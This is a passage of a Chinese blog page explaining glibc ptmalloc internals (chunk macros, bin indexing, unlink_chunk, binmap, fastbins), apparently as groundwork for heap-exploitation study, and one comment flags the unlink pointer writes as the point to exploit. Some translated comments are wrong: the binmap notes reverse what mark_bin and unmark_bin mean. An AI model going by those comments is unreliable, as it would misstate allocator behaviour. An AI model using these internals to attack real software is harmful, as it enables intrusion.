SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set the size of the chunk below P.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract p&#x27;s inuse bit */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)							      \</span></span><br><span class="line"><span class="meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* set/clear chunk as being inuse without otherwise disturbing */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_inuse(p)							      \</span></span><br><span class="line"><span class="meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size |= PREV_INUSE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_inuse(p)							      \</span></span><br><span class="line"><span class="meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at head, without disturbing its use bit */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head_size(p, s)  ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> GCC poison mchunk_size</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> GCC poison mchunk_prev_size</span></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   -------------------- Internal data structures --------------------</span></span><br><span class="line"><span class="comment">   内部数据结构</span></span><br><span class="line"><span class="comment">   所有内部状态都保存在下面定义的 malloc_state 实例中。除了在两种可选情况下，没有其他静态变量：</span></span><br><span class="line"><span class="comment"> * 如果定义了 USE_MALLOC_LOCK，则上面声明的 mALLOC_MUTEx。</span></span><br><span class="line"><span class="comment"> * 如果 mmap 不支持 MAP_ANONYMOUS，则为 mmap 提供一个虚拟文件描述符。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   注意许多技巧旨在最小化总的记账空间需求。结果大约是 1K 字节（对于 4 字节指针和 size_t）。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Bins</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   一个用于free chunk的数组。每个bin都是双向链接的。bins之间的间隔大致成比例（对数）分布。bin的数量非常多（128个）。这看起来可能有些过多，但在实际使用中效果非常好。大多数bin所包含的大小在 malloc 请求中并不常见，但对于片段和合并的块组合来说却是比较常见的，这正是这些箱子所存储的内容，因此可以快速找到。所有过程都保持不变，即没有一个合并的块物理上与另一个合并的chunk相邻，因此列表中的每个chunk都知道其前后是使用中的chunk或内存的末尾。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   bins中的chunk按大小顺序排列，大小相同的chunk在近似最近使用的块中进行排序。对于small bins而言，排序并不是必须的，因为它们都包含相同大小的chunk，但对于较大的chunk，有助于最佳适配分配。这些列表只是顺序的。保持它们有序几乎从来不需要遍历到足以使用更复杂的有序数据结构的程度。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   相同大小的chunk以最近释放的chunk在前的顺序链接，分配则从后面取。这导致了 LRU（FIFO）分配顺序，这通常为每个chunk提供了与相邻释放的chunk合并的平等机会，从而产生了更大的自由块并减少了碎片化。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   为了简化在双向链表中的使用，每个箱头都充当 malloc_chunk。这避免了对头的特殊处理。但为了节省空间并改善局部性，我们仅分配箱子的 fd/bk 指针，然后利用重定位技巧将这些视为 malloc_chunk* 的字段。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 地址计算 -- 请注意， bin_at(0) 不存在 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))			      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ++bin 的类似物 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 关于箱子内列表方向性的提醒 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure>

<p><code>bin_at()</code> 是一个宏，用于通过给定的索引从内存管理器（<code>m</code>）的 <code>bins</code> 数组中获取特定的 bin（内存块管理单元）。它的实现依赖于 <code>offsetof</code>，计算出特定 bin 的地址，并进行适当的类型转换。</p>
<p><strong>参数说明：</strong></p>
<ul>
<li><code>m</code>: 这是一个指向内存管理结构的指针，通常是一个包含多个 bins 的结构体。</li>
<li><code>i</code>: 这是一个 bin 的索引，表示你想要获取的 bin 的位置（注意，索引是从 1 开始的，<code>bin_at(0)</code> 不存在）。</li>
</ul>
<p>宏 bin_at(m, i)通过 bin index 获得 bin 的链表头，chunk 中的fd 和 bk 用于将空闲 chunk 链入链表中，而对于每个 bin 的链表头，只需要这两个域就可以了，prev_size 和 size 对链表 都来说都没有意义，浪费空间，ptmalloc 为了节约这点内存空间，增大 cpu 高速缓存的命中 率，在 bins 数组中只为每个 bin 预留了两个指针的内存空间用于存放 bin 的链表头的 fb 和 bk 指针。 </p>
<p>从 bin_at(m, i)的定义可以看出，bin[0]不存在，以 SIZE_SZ 为 4B 的平台为例，bin[1]的前 4B 存储的是指针 fb，后 4B 存储的是指针 bk，而 bin_at 返回的是 malloc_chunk 的指针，由 于 fb 在 malloc_chunk 的偏移地址为 offsetof (struct malloc_chunk, fd))&#x3D;8，所以用 fb 的地址减 去 8 就得到 malloc_chunk 的地址。但切记，对 bin 的链表头的 chunk，一定不能修改 prev_size 和 size 域，这两个域是与其他 bin 的链表头的 fb 和 bk 内存复用的。 </p>
<p>宏 next_bin(b)用于获得下一个 bin 的地址，根据前面的分析，我们知道只需要将当前 bin 的地址向后移动两个指针的长度就得到下一个 bin 的链表头地址。 每个 bin 使用双向循环链表管理空闲 chunk，bin 的链表头的指针 fb 指向第一个可用的 chunk，指针 bk 指向最后一个可用的 chunk。宏 first(b)用于获得 bin 的第一个可用 chunk， 宏 last(b)用于获得 bin 的最后一个可用的 chunk，这两个宏便于遍历 bin，而跳过 bin 的链表 头。</p>
<h2 id="Indexing"><a href="#Indexing" class="headerlink" title="Indexing"></a>Indexing</h2><p>这段代码主要是根据chunk的size去计算出合适的bins。</p>
<p><strong>smallbin:</strong></p>
<p>ptmalloc使用small bins管理空闲小chunk，每个small bin中的chunk的大小与bin的index 有如下关系： Chunk_size&#x3D;2 * SIZE_SZ * index 在 SIZE_SZ 为 4B 的平台上，small bins 中的 chunk 大小是以 8B 为公差的等差数列，最大 的 chunk 大小为 504B，最小的 chunk 大小为 16B，所以实际共 62 个 bin。分别为 16B、24B、 32B，„„，504B。在 SIZE_SZ 为 8B 的平台上，small bins 中的 chunk 大小是以 16B 为公差 的等差数列，最大的 chunk 大小为 1008B，最小的 chunk 大小为 32B，所以实际共 62 个 bin。 分别为 32B、48B、64B，„„，1008B。 ptmalloc 维护了 62 个双向环形链表（每个链表都具有链表头节点，加头节点的最大作 用就是便于对链表内节点的统一处理，即简化编程），每一个链表内的各空闲 chunk 的大小 一致，因此当应用程序需要分配某个字节大小的内存空间时直接在对应的链表内取就可以了，这样 既可以很好的满足应用程序的内存空间申请请求而又不会出现太多的内存碎片。我们可 以用 如下图来表示在 SIZE_SZ 为 4B 的平台上 ptmalloc 对 512B 字节以下的空闲 chunk 组织方 式 （所谓的分箱机制）。</p>
<img data-src="../images/image-20250422212550966.png" alt="image-20250422212550966" style="zoom:50%;" />

<p><strong>largebin:</strong></p>
<p>在 SIZE_SZ 为 4B 的平台上，大于等于 512B的空闲 chunk，或者，在 SIZE_SZ 为 8B 的平 台上，大小大于等于 1024B的空闲 chunk，由sorted bins 管理。Large bins 一共包括 63 个 bin， 每个 bin 中的 chunk 大小不是一个固定公差的等差数列，而是分成 6 组 bin，每组 bin 是一个 固定公差的等差数列，每组的 bin 数量依次为 32、16、8、4、2、1，公差依次为 64B、512B、 4096B、32768B、262144B 等。 以 SIZE_SZ 为 4B 的平台为例，第一个 large bin 的起始 chunk 大小为 512B，共 32 个 bin， 公差为 64B，等差数列满足如下关系： Chunk_size&#x3D;512 + 64 * index 第二个 large bin的起始 chunk 大小为第一组 bin 的结束 chunk 大小，满足如下关系： Chunk_size&#x3D;512 + 64 * 32 + 512 * index 同理，我们可计算出每个 bin 的起始 chunk 大小和结束 chunk 大小。这些 bin 都是很有 规律的，其实small bins 也是满足类似规律，small bins 可以看着是公差为 8 的等差数列，一 共有 64 个 bin（第 0和 1bin 不存在），所以我们可以将 small bins 和 large bins存放在同一个 包含 128 个 chunk 的数组上，数组的前一部分位 small bins，后一部分为 large bins，每个 bin 的 index 为 chunk 数组的下标，于是，我们可以根据数组下标计算出该 bin 的 chunk 大小（small bins）或是 chunk 大小范围（large bins），也可以根据需要分配内存块大小计算出所需 chunk 所属 bin 的 index，ptmalloc 使用了一组宏巧妙的实现了这种计算。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Indexing</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Bins for sizes &lt; 512 bytes contain chunks of all the same size, spaced</span></span><br><span class="line"><span class="comment">    8 bytes apart. Larger bins are approximately logarithmically spaced:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    64 bins of size       8</span></span><br><span class="line"><span class="comment">    32 bins of size      64</span></span><br><span class="line"><span class="comment">    16 bins of size     512</span></span><br><span class="line"><span class="comment">     8 bins of size    4096</span></span><br><span class="line"><span class="comment">     4 bins of size   32768</span></span><br><span class="line"><span class="comment">     2 bins of size  262144</span></span><br><span class="line"><span class="comment">     1 bin  of size what&#x27;s left</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    There is actually a little bit of slop in the numbers in bin_index</span></span><br><span class="line"><span class="comment">    for the sake of speed. This makes no difference elsewhere.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The bins top out around 1MB because we expect to service large</span></span><br><span class="line"><span class="comment">    requests via mmap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Bin 0 does not exist.  Bin 1 is the unordered list; if that would be</span></span><br><span class="line"><span class="comment">    a valid chunk size the small bins are bumped up one.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_32(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_32_big(sz)                                            \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_64(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index(sz) \</span></span><br><span class="line"><span class="meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span></span><br><span class="line"><span class="meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span></span><br><span class="line"><span class="meta">   : largebin_index_32 (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span></span><br></pre></td></tr></table></figure>

<p>宏bin_index(sz)根据所需内存大小计算出所需 bin 的 index，如果所需内存大小属于 small bins 的大小范围，调用 smallbin_index(sz)，否则调用 largebin_index(sz))。smallbin_index(sz) 的计算相当简单，如果 SIZE_SZ 为 4B，则将 sz 除以 8，如果 SIZE_SZ 为 8B，则将 sz 除以 16， 也就是除以small bins 中等差数列的公差。largebin_index(sz)的计算相对复杂一些，可以用如 下的表格直观的显示 chunk 的大小范围与 bin index 的关系。</p>
<h2 id="unlink-chunk"><a href="#unlink-chunk" class="headerlink" title="unlink_chunk"></a>unlink_chunk</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk; <span class="comment">//unlink操作的利用点</span></span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">	  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">	malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">	    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">	      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted_bin"></a>Unsorted_bin</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Unsorted chunks</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   所有从内存块拆分而来的剩余部分，以及所有被释放的内存块，</span></span><br><span class="line"><span class="comment">   首先都会被放置在“未排序” bin 中。在 malloc 函数给它们</span></span><br><span class="line"><span class="comment">   一次使用的机会之前，这些块将不会被移入常规的 bin。因此，</span></span><br><span class="line"><span class="comment">   基本上，未排序的内存块列表充当一个队列，内存块在 free（和</span></span><br><span class="line"><span class="comment">   malloc_consolidate）时被放入该队列，而在 malloc 时被取出（要么</span></span><br><span class="line"><span class="comment">   被使用，要么放入常规的 bin）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   对于未排序的内存块，NON_MAIN_ARENA 标志永远不会被设置，</span></span><br><span class="line"><span class="comment">   因此在大小比较时不需要考虑这个标志。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1))</span></span><br></pre></td></tr></table></figure>

<h2 id="Top"><a href="#Top" class="headerlink" title="Top"></a>Top</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Top</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   最上方可用的内存块（即，靠近可用内存末尾的块）被特殊处理。</span></span><br><span class="line"><span class="comment">   它从不被包含在任何 bin 中，仅在没有其他块可用时使用，</span></span><br><span class="line"><span class="comment">   如果它非常大，则会被释放回系统（参见 M_TRIM_THRESHOLD）。</span></span><br><span class="line"><span class="comment">   因为初始的 top 指向自身的 bin，初始大小为零，这样在第一次</span></span><br><span class="line"><span class="comment">   malloc 请求时强制进行扩展，从而避免在 malloc 中需要任何</span></span><br><span class="line"><span class="comment">   特殊代码来检查它是否已经存在。但是，在从系统获取内存时</span></span><br><span class="line"><span class="comment">   我们仍然需要这样做，因此在初始化和第一次调用 sysmalloc </span></span><br><span class="line"><span class="comment">   之间，我们让 initial_top 将 bin 视为在此期间合法但不可用的块。</span></span><br><span class="line"><span class="comment">   （这有点微妙，因为这依赖于在此期间前面的两个字都为零。）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 方便的是，未排序的 bin 可以在第一次调用时作为虚拟的顶部 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> initial_top(M)              (unsorted_chunks (M))</span></span><br></pre></td></tr></table></figure>

<h2 id="Binmap"><a href="#Binmap" class="headerlink" title="Binmap"></a>Binmap</h2><p>记录一个块内chunk的状态</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Binmap</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   为了帮助补偿大量的bins，一个一层索引结构被用来逐个桶(bin by bin)地搜索。</span></span><br><span class="line"><span class="comment">   `binmap` 是一个位向量，用于记录bins是否绝对为空，以便在遍历</span></span><br><span class="line"><span class="comment">   时可以跳过它们。位并不会在桶变空后立即清除，而是仅在</span></span><br><span class="line"><span class="comment">   malloc 遍历过程中注意到它们是空时才会清除。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 在映射字中保守地使用32位，即使在64位系统上也是如此 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINMAPSHIFT      5  <span class="comment">// 每个映射字的位移量，表示每个字包含 2^5 = 32 位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT)  <span class="comment">// 每个映射字包含的位数，这里是 32 位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP) <span class="comment">// 桶映射的大小，即总桶数除以每个映射字的位数</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将bin索引转换为桶映射字的索引</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)</span></span><br><span class="line"><span class="comment">// 根据bin的索引计算出对应的位掩码</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br><span class="line"><span class="comment">// 标记指定的桶为空，更新映射字</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block(i)] |= idx2bit(i))</span></span><br><span class="line"><span class="comment">// 清除指定的桶位，标记为非空</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block(i)] &amp;= ~(idx2bit(i)))</span></span><br><span class="line"><span class="comment">// 获取指定桶的映射状态（是否为空），返回对应的位</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block(i)] &amp; idx2bit(i))</span></span><br></pre></td></tr></table></figure>

<h2 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h2><p>单向链表，头插法，即每次插入新的chunk都在头节点和头结点的下一个节点进行插入</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   快速桶（Fastbins）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   一组链表，保存最近释放的小块内存。fastbin</span></span><br><span class="line"><span class="comment">   不是双向链接的。单向链接更快，并且由于块从未</span></span><br><span class="line"><span class="comment">   从这些链表的中间位置删除，因此不需要双向链接。</span></span><br><span class="line"><span class="comment">   此外，与常规桶不同，它们甚至不是以先进先出</span></span><br><span class="line"><span class="comment">   的顺序处理（使用更快的后进先出），因为在fastbin</span></span><br><span class="line"><span class="comment">   通常使用的瞬态上下文中，顺序并不是非常重要。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   fastbin中的块保持其使用位被设置，因此不能与</span></span><br><span class="line"><span class="comment">   其他释放的块合并。malloc_consolidate 函数会释放</span></span><br><span class="line"><span class="comment">   所有fastbin中的块，并将它们与其他释放的块合并。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span>  <span class="comment">// 定义指向 malloc_chunk 结构的指针类型</span></span><br><span class="line"><span 